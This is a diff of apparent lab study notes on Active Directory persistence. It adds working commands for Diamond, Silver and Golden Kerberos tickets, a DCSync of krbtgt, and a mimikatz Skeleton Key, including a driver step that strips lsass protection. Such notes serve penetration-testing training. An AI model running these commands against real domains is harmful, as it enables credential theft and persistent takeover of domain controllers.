@@ -12,7 +12,8 @@ Rubeus.exe diamond
 ```
 • We could also use _/tgtdeleg_ option in place of credentials in case we have access as a domain user:
 ```powershell
-Rubeus.exe diamond /krbkey:$hash /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+Rubeus.exe diamond /krbkey:$hash /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local 
+/dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
 
 
@@ -27,7 +28,7 @@ Rubeus.exe diamond /krbkey:$hash /tgtdeleg /enctype:aes /ticketuser:administrato
 #### Attack
 - Using hash of the Domain Controller computer account, below command provides access to file system on the DC.
 ```powershell
-BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:e9bb4c3d1327e29093dfecab8c2676f6 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:$hash /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
 • Similar command can be used for any other service on a machine. Which services? HOST, RPCSS, HTTP and many more
 
@@ -65,7 +66,7 @@ SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 
 __Create Golden Ticket__
 ```powershell
-BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
+BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:$key /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"
 ```
 
 ![[Pasted image 20231215170136.png]]
@@ -78,20 +79,31 @@ BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.mo
 - All the publicly known methods are NOT persistent across reboots.
 - Yet again, mimikatz to the rescue.
 
+>Note that Skeleton Key is not opsec safe and is also known to cause issues with AD CS.
+
 #### Attack
-- Use the below command to inject a skeleton key (password would be
-mimikatz) on a Domain Controller of choice. DA privileges required
+- Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. _DA privileges required_
 ```powershell
-Invoke-Mimikatz -Command '"privilege::debug"
-"misc::skeleton"' -ComputerName dcorp-
-dc.dollarcorp.moneycorp.local
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' 
+-ComputerName dcorp-dc.dollarcorp.moneycorp.local
 ```
-• Now, it is possible to access any machine with a valid username and password as "mimikatz"
+- Now, it is possible to access any machine with a valid username and password as "mimikatz"
 ```powershell
-`
-Enter-PSSession -Computername dcorp-dc -credential
-dcorp\Administrator
-Note that Skeleton Key is not opsec safe and is also known to cause issues with AD CS.
+Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
+```
+- In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:
+```powershell
+mimikatz # privilege::debug
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+mimikatz # misc::skeleton
+mimikatz # !-
+```
+> Note that above would be very noisy in logs - Service installation (Kernel mode driver)
+
+
+
+
 
 
 
